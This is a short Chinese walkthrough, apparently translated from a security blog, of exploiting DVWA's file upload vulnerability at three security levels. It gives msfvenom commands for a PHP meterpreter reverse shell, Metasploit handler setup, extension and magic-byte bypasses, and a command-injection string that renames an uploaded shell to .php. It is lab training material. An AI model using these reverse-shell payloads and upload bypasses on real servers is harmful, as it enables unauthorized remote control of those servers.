## 恶意文件上传DVWA漏洞（绕过所有安全）[^1]

### Low

msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw [^2]

```shell
msf > use multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.104
msf exploit(handler) > set lport 3333
msf exploit(handler) > run
meterpreter > sysinfo
```

### Medium

`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw` [^3]

### High

`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw` [^4]

`| copy C:\xampp\htdocs\DVWA\hackable\uploads\shell.jpeg C:\xampp\htdocs\DVWA\hackable\uploads\aa.php` [^5]

[原文](https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/)

---

[^1]: 文件上载漏洞是基于Web的应用程序的主要问题。在许多Web服务器中，此漏洞完全取决于允许攻击者上传隐藏恶意代码的文件的目的，然后可以在服务器上执行。攻击者可能会将网络钓鱼页面放入网站或破坏网站。攻击者可能会向其他人透露Web服务器的内部信息，并且未经授权的人员可能会将一些敏感数据的机会非正式。在DVWA中，网页允许用户上传图像，网页通过程序编码并检查文件的最后一个字符是“.jpg”，还是“.jpeg”或“.png”，然后才能上传图像目录。
[^2]: 在kali linux中打开终端并通过以下命令创建php后门。将显示的代码**复制**并**粘贴**到leafpad中，并像**PHP扩展**一样另存为**hack.php**在桌面上。上传成功并执行
[^3]: 现在将所选代码**保存**为桌面上的**raj.php.jpeg**。由于此文件将以中等安全性上载，这与低安全性略有不同，因为这显然会检查文件的扩展名。当您单击上载按钮时，拦截选项卡将用于捕获post方法。使用Burpsuite进行拦截，现在将**raj.php.jpeg**转换为**raj.php**
[^4]: 现在将所选代码**保存**为桌面上的**shell.jpeg**。由于这个文件将以高安全性上传，这与中低安全性略有不同，因为这显然会检查文件的扩展名以及代码段，因此在PHP代码之前**键入GIF98**并保存为**shell.jpeg**。
[^5]: 当使用jpeg扩展名上传时，此PHP文件无法直接在URL上执行。要将此文件重命名为PHP文件，请单击以从漏洞中**命令注入**选项。此漏洞允许您将此shell.jpeg复制并重命名为PHP文件。在文本框中输入下列类型将**复制**和**重命名** **shell.jpeg**到**aa.php**